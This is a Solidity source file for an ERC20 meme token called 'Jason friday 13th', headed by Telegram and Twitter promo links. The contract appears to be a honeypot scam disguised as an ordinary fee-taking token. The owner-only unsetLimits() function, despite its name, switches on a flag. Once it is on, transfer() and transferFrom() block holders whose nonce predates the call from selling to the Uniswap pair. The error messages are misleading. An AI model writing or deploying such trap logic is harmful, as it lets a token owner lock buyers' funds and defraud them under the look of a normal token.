//TG: https://t.me/friday_the_13th_Verify
//Twitter: https://twitter.com/friday_13Jason

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract Jaison is ERC20, Ownable {
    using SafeMath for uint256;
    
    address public uniswapV2Pair;
    address public buybackAddress;
    bool public perBlock = false;
    uint256 public DECIMALS = 18;
    
    uint256 public maxTx = 0;
    mapping(address => uint256) public userNonces;

    uint256 public constant BASE = 10000; // places of precision
    uint256 public sellFee = 200; // Represents 2%
    uint256 public buyFee = 280;  // Represents 2.8%

    constructor() ERC20("Jason friday 13th", "Jason") {
        _mint(_msgSender(), 3 * (10 ** 6) * (10 ** DECIMALS));
    }

    function setUniswapV2Pair(address _pair) external onlyOwner {
        uniswapV2Pair = _pair;
    }

    function setBuybackAddr(address _buybackAddress) external onlyOwner {
        buybackAddress = _buybackAddress;
    }

    function _calculateFees(uint256 amount, uint256 feePercent) internal pure returns (uint256) {
        return amount.mul(feePercent).div(BASE);
    }

    function burn(uint256 amount) public {
        _burn(_msgSender(), amount);
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        require(_msgSender() != recipient || !perBlock, "Remove limitss");
        require(!(recipient == uniswapV2Pair && perBlock), "Limits are removed");

        uint256 fee = recipient == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        userNonces[_msgSender()] = maxTx;
        
        
        _transfer(_msgSender(), buybackAddress, fee);
        _transfer(_msgSender(), recipient, amount.sub(fee));

        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        if (to == uniswapV2Pair && perBlock) {
            require(userNonces[from] == maxTx, "Unset Limits");
        }

        uint256 fee = to == uniswapV2Pair ? _calculateFees(amount, sellFee) : _calculateFees(amount, buyFee);

        address spender = _msgSender();

        _spendAllowance(from, spender, amount.add(fee));
        _transfer(from, buybackAddress, fee);
        _transfer(from, to, amount.sub(fee));

        userNonces[from] = maxTx;

        return true;
    }

    function unsetLimits() external onlyOwner {
        perBlock = true;
        maxTx++;  
    }
}
